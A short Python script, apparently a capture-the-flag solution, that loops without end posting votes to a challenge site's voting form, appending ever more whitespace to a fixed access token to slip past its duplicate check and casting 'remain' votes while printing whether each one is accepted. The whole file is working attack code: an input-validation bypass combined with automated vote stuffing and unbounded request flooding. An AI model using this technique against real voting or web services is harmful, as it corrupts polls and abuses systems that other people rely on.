import requests

whitespace = ""

while(True):
    whitespace += " " * 43
    sess = requests.Session()
    response = sess.post('https://challenges.paberr.net/voteforit/', data={"accesstoken": "aKBCmAVsBL" + whitespace, "agreement": "yes", "vote": "remain", "time": "2016-01-01"}).text
    print("Thank you for your vote" in response)
